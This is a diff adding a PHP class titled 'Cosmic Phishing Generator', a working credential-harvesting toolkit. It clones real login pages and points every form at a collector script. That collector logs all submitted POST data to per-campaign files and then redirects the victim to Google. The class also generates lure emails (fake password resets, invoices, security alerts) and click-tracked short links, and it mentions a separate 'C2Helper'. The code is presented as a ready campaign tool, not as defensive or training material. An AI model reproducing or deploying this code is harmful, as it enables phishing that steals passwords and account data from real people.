@@ -1,0 +1,206 @@
+<?php
+/**
+ * COSMIC PHISHING GENERATOR v2.0 – INDUSTRIAL‑GRADE PHISHING CAMPAIGNS
+ * Generates clone pages, email templates, and tracking links with SQLite backend.
+ */
+class PhishingGenerator {
+    private $db;
+    private $dataDir;
+    private $publicDir;
+
+    public function __construct($useDB = true) {
+        $this->dataDir = dirname(__DIR__, 2) . '/data/phishing/';
+        $this->publicDir = dirname(__DIR__, 2) . '/public/phishing/';
+
+        if (!is_dir($this->dataDir)) {
+            mkdir($this->dataDir, 0755, true);
+        }
+        if (!is_dir($this->publicDir)) {
+            mkdir($this->publicDir, 0755, true);
+        }
+
+        if ($useDB) {
+            $this->initDB();
+        }
+    }
+
+    private function initDB() {
+        $dbPath = $this->dataDir . 'generator.db';
+        $this->db = new SQLite3($dbPath);
+        $this->db->exec('PRAGMA journal_mode = WAL;');
+        $this->db->exec("CREATE TABLE IF NOT EXISTS campaigns (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            name TEXT,
+            target_url TEXT,
+            clone_path TEXT,
+            email_template TEXT,
+            created_at INTEGER,
+            clicks INTEGER DEFAULT 0
+        )");
+
+        $this->db->exec("CREATE TABLE IF NOT EXISTS links (
+            code TEXT PRIMARY KEY,
+            target_url TEXT,
+            campaign_id INTEGER,
+            clicks INTEGER DEFAULT 0,
+            created_at INTEGER
+        )");
+
+        $this->db->exec("CREATE INDEX IF NOT EXISTS idx_links_code ON links(code)");
+    }
+
+    /**
+     * Clone a webpage for phishing.
+     */
+    public function clonePage($url, $campaignName) {
+        $html = $this->fetchUrl($url);
+        if ($html === false) {
+            throw new RuntimeException("Failed to fetch URL: $url");
+        }
+
+        // Use DOMDocument for safe manipulation
+        $dom = new DOMDocument();
+        libxml_use_internal_errors(true);
+        $dom->loadHTML($html, LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
+        libxml_clear_errors();
+
+        // Modify forms
+        foreach ($dom->getElementsByTagName('form') as $form) {
+            $form->setAttribute('action', '/phishing/collect');
+            $form->setAttribute('method', 'post');
+        }
+
+        $html = $dom->saveHTML();
+
+        $safeName = preg_replace('/[^a-z0-9_-]/i', '_', $campaignName);
+        $saveDir = $this->publicDir . 'pages/' . $safeName . '/';
+        if (!is_dir($saveDir)) {
+            mkdir($saveDir, 0755, true);
+        }
+        $savePath = $saveDir . 'index.html';
+        file_put_contents($savePath, $html);
+
+        // Ensure collector exists
+        $this->ensureCollector();
+
+        $publicPath = '/phishing/pages/' . $safeName . '/';
+
+        // Insert into DB
+        if ($this->db) {
+            $stmt = $this->db->prepare("INSERT INTO campaigns (name, target_url, clone_path, created_at) VALUES (:name, :url, :path, :time)");
+            $stmt->bindValue(':name', $campaignName, SQLITE3_TEXT);
+            $stmt->bindValue(':url', $url, SQLITE3_TEXT);
+            $stmt->bindValue(':path', $publicPath, SQLITE3_TEXT);
+            $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
+            $stmt->execute();
+        }
+
+        return $publicPath;
+    }
+
+    private function fetchUrl($url) {
+        // Same as in PhishingCampaign (could be shared, but for brevity, duplicate)
+        if (function_exists('curl_init')) {
+            $ch = curl_init($url);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+            $html = curl_exec($ch);
+            curl_close($ch);
+            return $html === false ? false : $html;
+        } else {
+            $opts = [
+                'http' => ['method' => 'GET', 'header' => "User-Agent: Mozilla/5.0\r\n", 'timeout' => 15],
+                'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
+            ];
+            return @file_get_contents($url, false, stream_context_create($opts));
+        }
+    }
+
+    private function ensureCollector() {
+        $collectorPath = $this->publicDir . 'collect.php';
+        if (!file_exists($collectorPath)) {
+            $collector = <<<'EOF'
+<?php
+$data = $_POST;
+$campaign = $_GET['campaign'] ?? 'unknown';
+$log = date('Y-m-d H:i:s') . " | " . json_encode($data) . "\n";
+$logDir = __DIR__ . '/logs/';
+if (!is_dir($logDir)) mkdir($logDir, 0755, true);
+file_put_contents($logDir . $campaign . '.txt', $log, FILE_APPEND | LOCK_EX);
+header('Location: https://www.google.com');
+EOF;
+            file_put_contents($collectorPath, $collector);
+        }
+    }
+
+    /**
+     * Generate a phishing email template.
+     */
+    public function generateEmailTemplate($type, $targetName, $phishingLink) {
+        $templates = [
+            'password_reset' => "Dear $targetName,\n\nYour password has expired. Please reset it immediately: $phishingLink\n\nIT Support",
+            'invoice' => "Dear $targetName,\n\nPlease find attached invoice. Click to view: $phishingLink\n\nFinance Dept",
+            'security_alert' => "ALERT: Unusual login detected. Verify your account: $phishingLink\n\nSecurity Team"
+        ];
+        return $templates[$type] ?? $templates['security_alert'];
+    }
+
+    /**
+     * Create a tracking link (short URL) and store in DB.
+     */
+    public function createTrackingLink($targetUrl, $campaignId = null) {
+        do {
+            $code = generate_tracking_code(6); // from C2Helper
+            $exists = $this->db->querySingle("SELECT 1 FROM links WHERE code = '$code'");
+        } while ($exists);
+
+        $stmt = $this->db->prepare("INSERT INTO links (code, target_url, campaign_id, created_at) VALUES (:code, :url, :cid, :time)");
+        $stmt->bindValue(':code', $code, SQLITE3_TEXT);
+        $stmt->bindValue(':url', $targetUrl, SQLITE3_TEXT);
+        $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
+        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
+        $stmt->execute();
+
+        return '/l/' . $code;
+    }
+
+    /**
+     * Resolve a short code and log click.
+     */
+    public function resolveLink($code) {
+        $stmt = $this->db->prepare("SELECT target_url, campaign_id FROM links WHERE code = :code");
+        $stmt->bindValue(':code', $code, SQLITE3_TEXT);
+        $res = $stmt->execute();
+        $row = $res->fetchArray(SQLITE3_ASSOC);
+        if (!$row) {
+            return null;
+        }
+
+        // Increment clicks
+        $stmt = $this->db->prepare("UPDATE links SET clicks = clicks + 1 WHERE code = :code");
+        $stmt->bindValue(':code', $code, SQLITE3_TEXT);
+        $stmt->execute();
+
+        // Also increment campaign clicks if linked
+        if ($row['campaign_id']) {
+            $stmt = $this->db->prepare("UPDATE campaigns SET clicks = clicks + 1 WHERE id = :cid");
+            $stmt->bindValue(':cid', $row['campaign_id'], SQLITE3_INTEGER);
+            $stmt->execute();
+        }
+
+        return $row['target_url'];
+    }
+
+    /**
+     * Get campaign stats.
+     */
+    public function getCampaignStats($campaignId) {
+        $stmt = $this->db->prepare("SELECT * FROM campaigns WHERE id = :id");
+        $stmt->bindValue(':id', $campaignId, SQLITE3_INTEGER);
+        $res = $stmt->execute();
+        return $res->fetchArray(SQLITE3_ASSOC);
+    }
+}
